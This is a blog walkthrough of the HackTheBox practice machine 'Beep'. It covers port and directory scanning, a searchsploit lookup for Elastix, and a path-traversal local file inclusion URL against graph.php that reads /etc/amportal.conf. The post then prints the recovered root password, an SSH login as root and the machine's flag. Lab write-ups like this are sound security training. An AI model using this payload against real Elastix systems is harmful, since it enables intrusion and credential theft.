---
layout: post
title: Hackthebox Beep Walkthrough
categories: HackTheBox
---

![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-03-03/beep-badge.png)

# Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
This is a walkthrough of a box "Beep".<br>

# Solution
## 1. Initial Enumeration
### TCP Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.7 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-01 09:55 EET
Nmap scan report for 10.10.10.7
Host is up (0.044s latency).
Not shown: 65519 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: AUTH-RESP-CODE UIDL STLS EXPIRE(NEVER) APOP TOP IMPLEMENTATION(Cyrus POP3 server v2) PIPELINING RESP-CODES USER LOGIN-DELAY(0)
111/tcp   open  rpcbind    2 (RPC #100000)
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: ATOMIC LITERAL+ CATENATE ANNOTATEMORE OK CHILDREN IDLE X-NETSCAPE MULTIAPPEND UIDPLUS ID MAILBOX-REFERRALS IMAP4rev1 NAMESPACE LIST-SUBSCRIBED LISTEXT URLAUTHA0001 CONDSTORE UNSELECT Completed SORT=MODSEQ THREAD=ORDEREDSUBJECT THREAD=REFERENCES BINARY SORT RIGHTS=kxte NO STARTTLS RENAME QUOTA IMAP4 ACL
443/tcp   open  ssl/https?
|_ssl-date: 2020-03-01T09:01:11+00:00; +1h02m01s from scanner time.
880/tcp   open  status     1 (RPC #100024)
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax    HylaFAX 4.3.10
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix

Host script results:
|_clock-skew: 1h02m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 382.63 seconds

root@kali:~#
{% endhighlight %}

### Gobuster HTTP:
{% highlight shell %}
root@kali:~# gobuster dir -u http://10.10.10.7/ -x php -w /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.7/
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/03/01 10:04:30 Starting gobuster
===============================================================
Error: the server returns a status code that matches the provided options for non existing urls. http://10.10.10.7/23b3f8d9-6290-4f1e-85a5-9a8041a56e20 => 302. To force processing of Wildcard responses, specify the '--wildcard' switch

root@kali:~# 
{% endhighlight %}

### Gobuster HTTPS:
{% highlight shell %}
root@kali:~# gobuster dir -u https://10.10.10.7/ -k -x php -w /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://10.10.10.7/
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/03/01 10:12:31 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.php (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/admin (Status: 301)
/cgi-bin/ (Status: 403)
/config.php (Status: 200)
/configs (Status: 301)
/favicon.ico (Status: 200)
/help (Status: 301)
/images (Status: 301)
/index.php (Status: 200)
/index.php (Status: 200)
/lang (Status: 301)
/libs (Status: 301)
/mail (Status: 301)
/modules (Status: 301)
/panel (Status: 301)
/register.php (Status: 200)
/robots.txt (Status: 200)
/static (Status: 301)
/themes (Status: 301)
/var (Status: 301)
===============================================================
2020/03/01 10:15:22 Finished
===============================================================

root@kali:~# 
{% endhighlight %}


## 2. Getting Root
On port 443, we can find a login console of Elastix.
![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-03-03/2020-03-01-10-18-39.png)

We can find a vulnerability for the Elastix by searchsploit.
{% highlight shell %}
root@kali:~# searchsploit elastix
----------------------------------------------------------- ----------------------------------------
 Exploit Title                                             |  Path
                                                           | (/usr/share/exploitdb/)
----------------------------------------------------------- ----------------------------------------
Elastix - 'page' Cross-Site Scripting                      | exploits/php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities    | exploits/php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilit | exploits/php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion           | exploits/php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                          | exploits/php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                         | exploits/php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution     | exploits/php/webapps/18650.py
----------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
{% endhighlight %}

This time, we can take advantage of the vulnerability "<a href="https://www.exploit-db.com/exploits/37637">Elastix 2.2.0 - 'graph.php' Local File Inclusion</a>".
![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-03-03/2020-03-01-23-18-10.png)

According to this page, by accessing the following HTTP request, we can exploit the LFI of Elastix.
{% highlight shell %}
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
{% endhighlight %}
![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-03-03/2020-03-01-22-59-39.png)

If we grep the word "password", we can find an interesting parameter.
![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-03-03/2020-03-01-22-59-08.png)

Now we got the following password.
{% highlight shell %}
jEhdIekWmdjE
{% endhighlight %}

This time, we can use this password for connecting to SSH.<br>
As always, we have "root.txt" in the directory "/root".
{% highlight shell %}
root@kali:~# ssh root@10.10.10.7
root@10.10.10.7's password: 
Last login: Sun Mar  1 19:45:39 2020 from 10.10.14.27

Welcome to Elastix 
----------------------------------------------------

To access your Elastix System, using a separate workstation (PC/MAC/Linux)
Open the Internet Browser using the following URL:
http://10.10.10.7

[root@beep ~]# cat /root/root.txt 
d88e006123842106982acce0aaf453f0

[root@beep ~]#
{% endhighlight %}
